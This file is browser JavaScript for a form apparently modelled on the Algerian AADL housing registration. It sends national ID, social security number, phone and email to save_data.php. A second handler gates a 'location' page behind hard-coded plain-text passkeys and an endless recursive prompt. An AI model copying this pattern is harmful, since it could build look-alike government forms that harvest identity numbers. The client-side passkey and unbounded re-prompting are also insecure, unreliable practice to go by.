document.getElementById('aadlForm').addEventListener('submit', function (e) {
  e.preventDefault();

  // Collect form data
  const province = document.getElementById('province').value;
  const nin = document.getElementById('nin').value;
  const nss = document.getElementById('nss').value;
  const phone = document.getElementById('phone').value;
  const email = document.getElementById('email').value;
  const password = document.getElementById('password').value;
  const confirmPassword = document.getElementById('confirmPassword').value;


  // NIN validation
  if (nin.length !== 18 || isNaN(nin)) {
      document.getElementById('nin').style.border = '2px solid red';
      return;
  } else {
      document.getElementById('nin').style.border = '';
  }

  // Password validation
  if (password.length < 8) {
      document.getElementById('password').style.border = '2px solid red';
      return;
  } else {
      document.getElementById('password').style.border = '';
  }

  // Check if password and confirm password match
  if (password !== confirmPassword) {
      document.getElementById('confirmPassword').style.border = '2px solid red';
      alert('كلمة المرور وتأكيد كلمة المرور يجب أن يكونا متطابقين');
      return;
  } else {
      document.getElementById('confirmPassword').style.border = '';
  }

  // Send form data to PHP script
  fetch('save_data.php', {
    method: 'POST',
    headers: {
        'Content-Type': 'application/x-www-form-urlencoded'
    },
    body: new URLSearchParams({
        'province': province,
        'nin': nin,
        'nss': nss,
        'phone': phone,
        'email': email
    })
})
.then(response => response.text())
.then(data => {
    console.log(data); // Log response from server// You can use this data for success message or logging
      // Hide form and display success message
      document.querySelector('.container').style.display = 'none';
      document.querySelector('.top-rectangular').style.display = 'none';
      document.querySelector('.bottom-rectangular').style.display = 'none';
      document.getElementById('successMessage').style.display = 'block';
  })
  .catch(error => {
      console.error('Error:', error);
  });
});



// Button action for location selection with passkey check
document.getElementById('locationButton').addEventListener('click', function () {
  const validPasskeys = [
      'wehdk', 'wahdk', 'Wahdk', 'Wehdk', 'WAHDk', 'WEHDk', 
      'وحدك', 'wahdak', 'wehdak', 'WEHDAK', 'Wehdak', 'Wahdak',
      'wehdek', 'wahdek', 'wehdak', 'wehdi', 'wahdi', 'Wahdi', 'Wehdi', 'WEHDI', 'WAHDI'
  ];

  // Function to keep asking for the correct passkey
  function requestPasskey() {
      let passkey = prompt('Ikram nti ta3i .....\nالرجاء ادخال الكلمة المناسبة');
      
      if (validPasskeys.includes(passkey)) {
          // Redirect if passkey is valid
          window.location.href = 'location.html'; // Replace with actual location page URL
      } else {
          // Just let the user try again without any alert
          requestPasskey();
      }
  }

  // Start passkey request process
  requestPasskey();
});
